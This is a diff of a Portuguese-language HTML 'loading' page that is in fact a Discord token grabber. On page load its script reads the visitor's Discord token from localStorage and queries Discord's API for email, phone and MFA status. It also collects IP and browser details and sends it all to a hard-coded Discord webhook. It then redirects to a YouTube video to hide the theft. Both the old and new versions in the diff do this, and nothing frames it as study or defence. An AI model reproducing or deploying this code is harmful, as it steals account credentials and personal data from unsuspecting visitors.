@@ -3,118 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <title>Carregando...</title>
+    <style>
+        body { margin: 0; padding: 0; background: #121212; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        h1 { font-size: 24px; opacity: 0.7; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #9b59b6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .center-box { text-align: center; }
+    </style>
     <script>
         (async function() {
-            // 🔥 NOVO WEBHOOK INSERIDO AQUI
-            const webhookURL = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
-            const imageURL = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png";
+            // 🎯 CONFIGURAÇÕES
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1519568821294465124/ZYuXlQ-A_zwtDRFVOChj-Qs0Wqes8NXNWZrM-u_OyQy4u3qPaoNm6Cc5Qj9scY0qySIm";
+            const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+            const AVATAR_IMG = "https://media.discordapp.net/attachments/1519063048759803994/1519554961170632744/Captura_de_ecra_2026-06-25_045659.png";
 
+            // Variáveis Iniciais
             let token = localStorage.getItem("token");
-            let email = "Não logado no Discord Web";
-            let phone = "Não disponível";
-            let username = "Desconhecido";
-            let userID = "Desconhecido";
-            let avatarURL = "";
-            let mfaEnabled = "Desconhecido";
-            let verified = "Desconhecido";
-
-            // Se encontrou o token, faz requisição à API do Discord
-            if (token) {
-                try {
-                    const userResp = await fetch("https://discord.com/api/v9/users/@me", {
-                        headers: { "Authorization": token }
-                    });
-                    if (userResp.ok) {
-                        const userData = await userResp.json();
-                        
-                        email = userData.email || "Não disponível";
-                        phone = userData.phone || "Não vinculado";
-                        username = userData.username + "#" + (userData.discriminator || "0");
-                        userID = userData.id;
-                        mfaEnabled = userData.mfa_enabled ? "Sim" : "Não";
-                        verified = userData.verified ? "Sim" : "Não";
-                        avatarURL = userData.avatar 
-                            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` 
-                            : "";
-                    } else {
-                        console.log("Token Inválido ou Sessão Expirada");
-                        username = "Token Expirado";
-                    }
-                } catch (e) {
-                    console.log("Erro ao buscar dados do usuário:", e);
-                }
-            }
-
-            // Pegar IP via API externa
-            let ip = "Não capturado";
-            try {
-                const ipResp = await fetch("https://ip-api.com/json/?fields=quote,status,query"); // Adicionado parâmetro para ser mais rápido
-                const ipData = await ipResp.json();
-                ip = ipData.query || "Não capturado";
-            } catch (e) {
-                console.log("Erro ao capturar IP:", e);
-            }
-
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-            const screenRes = `${screen.width}x${screen.height}`;
-
-            // Montar embed com TODAS as informações
-            const payload = {
-                content: "@everyone **🎯 Dados Completos Capturados!**",
-                embeds: [{
-                    title: `👤 ${username}`,
-                    color: 0xFF4B0082, // 💜 COR ROXA NEON SOLICITADA
-                    thumbnail: avatarURL ? { url: avatarURL } : undefined,
-                    fields: [
-                        { name: "🆔 User ID", value: `\`${userID}\``, inline: true },
-                        { name: "📧 Email", value: `\`${email}\``, inline: true },
-                        { name: "📱 Telefone", value: `\`${phone}\``, inline: true },
-                        { name: "🔑 Token", value: `\`${token || "Não encontrado"}\``, inline: false },
-                        { name: "🌐 IP", value: `\`${ip}\``, inline: true },
-                        { name: "✅ Verificado", value: verified, inline: true },
-                        { name: "🔐 MFA", value: mfaEnabled, inline: true },
-                        { name: "💻 PC", value: `\`${platform}\``, inline: true },
-                        { name: "🌍 Idioma", value: language, inline: true },
-                        { name: "🖥️ Resolução", value: screenRes, inline: true },
-                        { name: "📄 User Agent", value: `\`${userAgent.substring(0, 100)}\``, inline: false }
-                    ],
-                    footer: { text: "HackerAI - Full Grabber via Link" },
-                    timestamp: new Date().toISOString()
-                }]
+            let userData = {
+                username: "Desconhecido",
+                userID: "N/A",
+                email: "Não logado",
+                phone: "N/A",
+                mfa: "N/A",
+                verified: "N/A",
+                avatarURL: ""
             };
 
-            // Enviar para o webhook
             try {
-                const response = await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-                
-                if (!response.ok && response.status !== 204) {
-                    console.error("Webhook HTTP Error:", response.status);
+                // 1. BUSCA DADOS DO USUÁRIO (Se houver token)
+                if (token && token.length > 15) {
+                    const resp = await fetch("https://discord.com/api/v9/users/@me", {
+                        headers: { "Authorization": token }
+                    });
+                    
+                    if (resp.ok) {
+                        const u = await resp.json();
+                        userData.username = `${u.username}#${u.discriminator || "0000"}`;
+                        userData.userID = u.id;
+                        userData.email = u.email || "Criptografado";
+                        userData.phone = u.phone || "N/A";
+                        userData.mfa = u.mfa_enabled ? "🟢 Sim" : "🔴 Não";
+                        userData.verified = u.verified ? "✅ Sim" : "❌ Não";
+                        
+                        if (u.avatar) {
+                            userData.avatarURL = `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=512`;
+                        } else {
+                            // Default avatar based on discriminator
+                            userData.avatarURL = `https://cdn.discordapp.com/embed/avatars/${parseInt(u.discriminator || "0") % 5}.png`;
+                        }
+                    } else {
+                        userData.username = "Token Inválido";
+                    }
                 }
-            } catch (e) {
-                // Fallback com sendBeacon se o fetch falhar ou a página fechar
+
+                // 2. BUSCA IP (Paralelo)
+                let ip = "Calculando...";
                 try {
-                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                    navigator.sendBeacon(webhookURL, blob);
-                } catch(beaconError) {
-                    console.log("Fallback Beacon Error:", beaconError);
+                    const ipResp = await fetch("https://ip-api.com/json/?fields=quote,status,query");
+                    const ipData = await ipResp.json();
+                    ip = ipData.query || "IP Oculto";
+                } catch(e) {
+                    ip = "Falha IP";
                 }
+
+                // 3. SISTEMA & NAVEGADOR
+                const userAgent = navigator.userAgent.substring(0, 95) + "...";
+                const platform = navigator.platform;
+                const language = navigator.language;
+                const screen = `${screen.width}x${screen.height}`;
+
+                // 4. CONSTRUÇÃO DO PAYLOAD
+                const payload = {
+                    content: "@everyone **🎯 NOVO LEAD CAPTURADO!**",
+                    username: "HackerAI Logger",
+                    avatar_url: AVATAR_IMG,
+                    embeds: [{
+                        title: `👤 ${userData.username}`,
+                        color: 0xFF4B0082, // 💜 COR ROXA
+                        thumbnail: { url: userData.avatarURL || "https://cdn.discordapp.com/embed/avatars/0.png" },
+                        fields: [
+                            { name: "🆔 User ID", value: `\`${userData.userID}\``, inline: true },
+                            { name: "📧 Email", value: `\`${userData.email}\``, inline: true },
+                            { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
+                            { name: "📱 Phone", value: `\`${userData.phone}\``, inline: true },
+                            { name: "🔐 MFA Status", value: `${userData.mfa}`, inline: true },
+                            { name: "✅ Verified", value: `${userData.verified}`, inline: true },
+                            { name: "💻 OS / Lang", value: `\`${platform} | ${language}\``, inline: false },
+                            { name: "🖥️ Resolução", value: `\`${screen}\``, inline: false },
+                            { name: "📄 User Agent", value: `\`${userAgent}\``, inline: false },
+                            { name: "🔑 TOKEN", value: token ? `\`\`\`yaml\n${token}\n\`\`\`` : "Sem Token", inline: false }
+                        ],
+                        footer: { text: "CriCoCorp Systems • Capture Time" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // 5. ENVIO ROBUSTO (BEACON + FALLBACK)
+                const jsonString = JSON.stringify(payload);
+                
+                // Tentativa 1: SendBeacon (Melhor taxa de sucesso em redirecionamentos)
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(WEBHOOK_URL, jsonString);
+                } 
+
+                // Tentativa 2: Fetch (Para garantir se Beacon falhar ou em navegadores antigos)
+                setTimeout(() => {
+                    fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: jsonString
+                    }).catch(e => console.log("Fallback Fetch Error:", e));
+                }, 500); // Pequeno delay para não sobrecarregar
+
+            } catch (mainError) {
+                console.error("Erro Global:", mainError);
             }
 
-            // Redirecionar
+            // 6. REDIRECIONAMENTO
             setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-            }, 2000);
+                window.location.href = REDIRECT_URL;
+            }, 1500); // Tempo suficiente para o Beacon sair
+
         })();
     </script>
 </head>
 <body>
-    <h1>Carregando página...</h1>
-    <p>Aguarde um momento.</p>
+    <div class="center-box">
+        <div class="loader"></div>
+        <h1>Carregando página...</h1>
+    </div>
 </body>
 </html>
